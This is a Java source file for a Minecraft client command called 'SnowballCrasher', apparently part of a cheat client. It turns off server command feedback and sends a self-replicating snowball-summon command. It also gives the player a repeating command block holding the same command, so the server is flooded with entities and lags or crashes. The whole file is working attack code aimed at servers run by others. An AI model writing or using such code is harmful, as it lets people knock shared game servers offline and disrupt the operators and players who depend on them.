package coffee.client.feature.command.impl;

import coffee.client.CoffeeMain;
import coffee.client.feature.command.Command;
import coffee.client.feature.command.argument.PlayerFromNameArgumentParser;
import coffee.client.feature.command.coloring.ArgumentType;
import coffee.client.feature.command.coloring.PossibleArgument;
import coffee.client.feature.command.coloring.StaticArgumentServer;
import coffee.client.feature.command.exception.CommandException;
import net.minecraft.entity.player.PlayerEntity;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;

import java.util.Objects;

import static coffee.client.CoffeeMain.client;
import static coffee.client.helper.util.Utils.Logging.message;

public class SnowballCrasher extends Command {

    public SnowballCrasher() {
        super("SnowballCrasher", "Crash the server by placing a command block that crashes the server when a snowball is thrown", "crash", "snowballcrasher");
    }

    @Override
    public PossibleArgument getSuggestionsWithType(int index, String[] args) {
        return StaticArgumentServer.serveFromStatic(
                index,
                new PossibleArgument(
                        ArgumentType.PLAYER,
                        () -> Objects.requireNonNull(client.world)
                                .getPlayers()
                                .stream()
                                .map(abstractClientPlayerEntity -> abstractClientPlayerEntity.getGameProfile().getName())
                                .toList()
                                .toArray(String[]::new)
                )
        );
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        validateArgumentsLength(args, 1, "Provide target player");
        PlayerEntity target = new PlayerFromNameArgumentParser(true).parse(args[0]);
        String targetName = " ";
        client.getNetworkHandler().sendCommand("gamerule sendCommandFeedback false");
        client.getNetworkHandler().sendCommand("execute at @e[type=snowball] run summon minecraft:snowball ~ ~ ~");
        ItemStack stack = new ItemStack(Items.REPEATING_COMMAND_BLOCK, 1);
        try {
            stack.setNbt(StringNbtReader.parse(
                    "{BlockEntityTag:{Command:\"/execute at @e[type=snowball] run summon minecraft:snowball ~ ~ ~\",powered:0b,auto:1b,conditionMet:1b}}"));
        } catch (Exception e) {
            e.printStackTrace();
        }
        client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, stack));
        message("Place the command block to keep lagging the server when a snowball is thrown");
    }
}
